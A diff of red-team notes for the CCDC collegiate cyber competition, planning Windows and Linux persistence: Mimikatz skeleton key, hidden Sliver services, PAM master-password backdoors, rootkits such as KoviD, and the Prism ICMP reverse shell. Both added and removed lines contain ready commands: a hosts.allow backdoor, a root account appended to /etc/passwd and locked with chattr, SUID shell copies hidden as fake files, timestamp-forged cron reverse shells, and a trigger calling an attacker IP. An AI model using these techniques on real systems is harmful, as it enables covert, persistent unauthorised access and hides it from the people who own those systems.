@@ -31,6 +31,10 @@ pagetitle: Red Teaming for CCDC
 
 **Windows:**
 - Todo
+  - Write a persistence script that does the following 
+    - (maybe) Creates an exclusion for ProgramData
+    - Downloads and executes Mimikatz's skeleton key module
+    - Downloads sliver shell and creates a sliver service hidden with ACLs
   - Investigate hiding services with ACLs: https://www.sans.org/blog/red-team-tactics-hiding-windows-services
     - This seems extremely good
   - Pivoting with netsh port proxy
@@ -73,38 +77,31 @@ pagetitle: Red Teaming for CCDC
 
 **Linux:**
 - Todo:
+  - Write a persistence script that does the following
+    - Backdoors PAM and adds the master password
+    - Adds a sliver script somewhere in the system
+    - Runs prism
+    - Hides all of the above with a rootkit
   - Investigate these methods: 
     - TCP Wrapped Services: `echo 'ALL: ALL: spawn ({backdoor}) & :allow' >> /etc/hosts.allow)` (or `hosts.deny`)
     - [Prism](https://github.com/andreafabrizi/prism) ICMP backdoor (connects out to host machine)
     - https://github.com/milabs/awesome-linux-rootkits - list of rootkits
-    - https://github.com/jarun/spy - grabs keyboard input and puts it in /sys/kernel/debug/kisni/keys
+      - https://github.com/carloslack/KoviD seems like a really solid candidate for hiding files, connections, and keylogging
+      - https://github.com/h3xduck/TripleCross this seems like a contender, except does support nearly as many linux kernels
     - https://github.com/ait-aecid/caraxes/ - hides files, could we use this to hide an ssh key?
-    - https://github.com/Aegrah/PANIX - Linux persistence framework (this seems REALLY REALLY good)
     - https://github.com/draios/sysdig - `-c spy_users` can read every user command ran?
-- PANIX
+- [PANIX](https://github.com/Aegrah/PANIX)
   - One-stop shop for a persistence script, this thing is NICE
     - `./panix.sh --suid --default` gives SUID to dash, python, and find
       - `dash -p`, `find . -exec /bin/sh -p \; -quit`, or `python3 -c 'import os; os.execl("/bin/sh", "sh", "-p")'`
-    - 
-- Run [linux_persistence.sh {ip}:{port} {sliver_payload_file} {pam_so_file}](https://khaelkugler.com/scripts/linux_persistence.sh.txt) while hosting the payload
-  - Make sure to point the script to the correct location to pull both files from
-    - Make sure to generate sliver payloads beforehand
-    - [PAM backdoor binary](https://khaelkugler.com/scripts/pam_login.so) can be downloaded from `https://khaelkugler.com/scripts/pam_login.so`
-- Add SSH keys
-  - `mkdir /root/.ssh` and add key to `/root/.ssh/authorized_keys`
-- Modify `/etc/passwd` and `/etc/ssh/sshd_config`
-  - `echo 'wwwdata:Fdzt.eqJQ4s0g:0:0:root:/root:/bin/bash' >> /etc/passwd && chattr +i /etc/passwd && echo 'PermitRootLogin yes' >> /etc/ssh/sshd_config && chattr +i /etc/ssh/sshd_config`
-- Use setuid binaries in weird locations (like a fake .kernel file):
-  - `cp /bin/zsh /.kernel && chmod +sss /.kernel && touch -d "4 May 2024" /.kernel && chattr +i /.kernel`
-  - `chattr` makes the file immutable (and gives ROOT a generic access denied error???)
-- Skeleton key
-  - Copy [pam_login.so](https://khaelkugler.com/scripts/pam_login.so) into `/etc/pam.d/pam_login.so`
-  - Add `auth sufficient /etc/pam.d/pam_login.so` to the top of `/etc/pam.d/common-auth`
-    - To make it so users don't have to authenticate twice with their normal password, add `try_first_pass` to the end of `auth pam_unix.so`
-- Cron jobs:
-  - Make innocuous cron jobs that are just shells sending out continuous connections
-  - Upload shell to `/etc/cron.hourly/locate`, `touch -d "12 Jul 2024" /etc/cron.hourly/locate` to make it non-sus, and `chattr +i /etc/cron.hourly/locate`
-    - Has to start with a `#!/bin/bash`
+- [Prism](https://github.com/andreafabrizi/prism)
+  - Sends out a reverse shell after sending a ping with a certain payload
+    - After specifying variables in C code itself, build with `gcc -DDETACH -DNORENAME -Wall -s -static -o {outfile} prism.c`
+    - Run as root on victim, then to trigger do `sudo python2 sendPacket.py {target} {password_set} {attacker_IP} {attacker_port}`
+  - This seems kinda cool, but wouldn't be anything special unless we could somehow hide the connection with a rootkit
+- [Kovid](https://github.com/carloslack/KoviD)
+  - By god what a beautiful piece of code
+  - Can get root as any process by running `kill -SIGCONT 666`
 
 
 ## Domain Persistence
